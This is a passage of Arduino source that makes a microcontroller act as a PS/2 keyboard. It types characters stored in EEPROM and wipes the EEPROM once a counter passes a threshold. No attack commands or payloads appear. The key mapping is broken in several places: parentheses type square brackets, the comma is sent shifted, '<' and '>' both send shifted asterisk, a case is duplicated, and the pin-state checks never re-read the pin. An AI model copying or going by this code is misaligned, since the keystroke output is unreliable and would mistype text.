                   else if (cc == 'W') { keyboardwriter.keyboard_press_special(PS2dev::W); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::W); delay (1);}
                   else if (cc == 'X') { keyboardwriter.keyboard_press_special(PS2dev::X); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::X); delay (1);}
                   else if (cc == 'Y') { keyboardwriter.keyboard_press_special(PS2dev::Y); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Y); delay (1);}
                   else if (cc == 'Z') { keyboardwriter.keyboard_press_special(PS2dev::Z); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::Z); delay (1);}

                   
if (cc == '[') { keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);}
                   else if (cc == ']') { keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);}
                   else if (cc == '(') { keyboardwriter.keyboard_press(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::OPEN_BRACKET); delay (1);}
                   else if (cc == ')') { keyboardwriter.keyboard_press(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::CLOSE_BRACKET); delay (1);}
                   else if (cc == ' ') { keyboardwriter.keyboard_press(PS2dev::SPACE); delay (25);keyboardwriter.keyboard_release(PS2dev::SPACE); delay (1);}

if (cc == '{') { keyboardwriter.keyboard_press_special(PS2dev::OPEN_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::OPEN_BRACKET); delay (1);}
                   else if (cc == '}') { keyboardwriter.keyboard_press_special(PS2dev::CLOSE_BRACKET); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::CLOSE_BRACKET); delay (1);}
                   else if (cc == '!') { keyboardwriter.keyboard_press_special(PS2dev::ONE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::ONE); delay (1);}
                   else if (cc == '@') { keyboardwriter.keyboard_press_special(PS2dev::TWO); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::TWO); delay (1);}
                   else if (cc == '#') { keyboardwriter.keyboard_press_special(PS2dev::THREE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::THREE); delay (1);}
                   else if (cc == '$') { keyboardwriter.keyboard_press_special(PS2dev::FOUR); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::FOUR); delay (1);}
                   else if (cc == '%') { keyboardwriter.keyboard_press_special(PS2dev::FIVE); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::FIVE); delay (1);}
                   else if (cc == '^') { keyboardwriter.keyboard_press_special(PS2dev::SIX); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SIX); delay (1);}
                   else if (cc == '&') { keyboardwriter.keyboard_press_special(PS2dev::SEVEN); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SEVEN); delay (1);}
                   else if (cc == '*') { keyboardwriter.keyboard_press_special(PS2dev::EIGHT); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::EIGHT); delay (1);}
                   else if (cc == '_') { keyboardwriter.keyboard_press_special(PS2dev::MINUS); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::MINUS); delay (1);}
                   else if (cc == '-') { keyboardwriter.keyboard_press(PS2dev::MINUS); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::MINUS); delay (1);}
                   else if (cc == '=') { keyboardwriter.keyboard_press(PS2dev::EQUAL); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::EQUAL); delay (1);}
                   else if (cc == '+') { keyboardwriter.keyboard_press_special(PS2dev::EQUAL); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::EQUAL); delay (1);}
                   else if (cc == '|') { keyboardwriter.keyboard_press_special(PS2dev::BACKSLASH); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::BACKSLASH); delay (1);}
                   else if (cc == '*') { keyboardwriter.keyboard_press(PS2dev::ASTERISK); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::ASTERISK); delay (1);}
                   else if (cc == '`') {  writeupperqoute1();}
                   else if (cc == '~') {  writeupperqoute4();}
                   else if (cc == '?') { keyboardwriter.keyboard_press_special(PS2dev::SLASH); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SLASH); delay (1);}
                   else if (cc == '<') { keyboardwriter.keyboard_press_special(PS2dev::ASTERISK); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::ASTERISK); delay (1);}
                   else if (cc == '>') { keyboardwriter.keyboard_press_special(PS2dev::ASTERISK); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::ASTERISK); delay (1);}
                   else if (cc == '/') { keyboardwriter.keyboard_press(PS2dev::SLASH); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SLASH); delay (1);}
                   else if (cc == '"') {  writeupperqoute3();}
                   else if (cc == ';') { keyboardwriter.keyboard_press(PS2dev::SEMI_COLON); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::SEMI_COLON); delay (1);}
                   else if (cc == ':') { keyboardwriter.keyboard_press_special(PS2dev::SEMI_COLON); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::SEMI_COLON); delay (1);}
                   else if (cc == ',') { keyboardwriter.keyboard_press_special(PS2dev::COMMA); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release_special(PS2dev::COMMA); delay (1);}
                   else if (cc == '.') { keyboardwriter.keyboard_press(PS2dev::PERIOD); delay (25);keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);keyboardwriter.keyboard_release(PS2dev::PERIOD); delay (1);}






                  delayMicroseconds(45);




if (cc == '1') { keyboardwriter.keyboard_press(PS2dev::ONE); delay (25);keyboardwriter.keyboard_release(PS2dev::ONE); delay (1);}
                   else if (cc == '2') { keyboardwriter.keyboard_press(PS2dev::TWO); delay (25);keyboardwriter.keyboard_release(PS2dev::TWO); delay (1);}
                   else if (cc == '3') { keyboardwriter.keyboard_press(PS2dev::THREE); delay (25);keyboardwriter.keyboard_release(PS2dev::THREE); delay (1);}
                   else if (cc == '4') { keyboardwriter.keyboard_press(PS2dev::FOUR); delay (25);keyboardwriter.keyboard_release(PS2dev::FOUR); delay (1);}
                   else if (cc == '5') { keyboardwriter.keyboard_press(PS2dev::FIVE); delay (25);keyboardwriter.keyboard_release(PS2dev::FIVE); delay (1);}
                   else if (cc == '6') { keyboardwriter.keyboard_press(PS2dev::SIX); delay (25);keyboardwriter.keyboard_release(PS2dev::SIX); delay (1);}
                   else if (cc == '7') { keyboardwriter.keyboard_press(PS2dev::SEVEN); delay (25);keyboardwriter.keyboard_release(PS2dev::SEVEN); delay (1);}
                   else if (cc == '8') { keyboardwriter.keyboard_press(PS2dev::EIGHT); delay (25);keyboardwriter.keyboard_release(PS2dev::EIGHT); delay (1);}
                   else if (cc == '9') { keyboardwriter.keyboard_press(PS2dev::NINE); delay (25);keyboardwriter.keyboard_release(PS2dev::NINE); delay (1);}
                   else if (cc == '0') { keyboardwriter.keyboard_press(PS2dev::ZERO); delay (25);keyboardwriter.keyboard_release(PS2dev::ZERO); delay (1);}



                                      
                      delayMicroseconds(75);
                    
 
                   
                  keyboardwriter.keyboard_release(PS2dev::RIGHT_SHIFT);
                  
                  int caniwrite = digitalRead(9);
                  
                  if (caniwrite == LOW) {
                    delay(50);
                   if (caniwrite == LOW) {  isdone =0 ; digitalWrite(9,LOW);  break; return; }
                  }
                 if(iformat > 600){
                    delay (100);  
                      if (caniwrite == HIGH  ) {
                         delay (50);
                          if (caniwrite == LOW   ) {return;}
                         writeiformat();
                          delay (50);
                               if (caniwrite == LOW  ) {return;}
                          delay (25);
                          if (caniwrite == LOW  ) {return;}
                          else{
                                for (int x = 0 ; x < EEPROM.length() ; x++){
                                char cc =  EEPROM.read(x);
                                EEPROM.update(x, '0');//-1
                                }
                             }
                         
                      }
                      break;}//format check > 600
                   }//2nd for
}
 
    // SAHER BLUE EAGLE
 // SAHER BLUE EAGLE
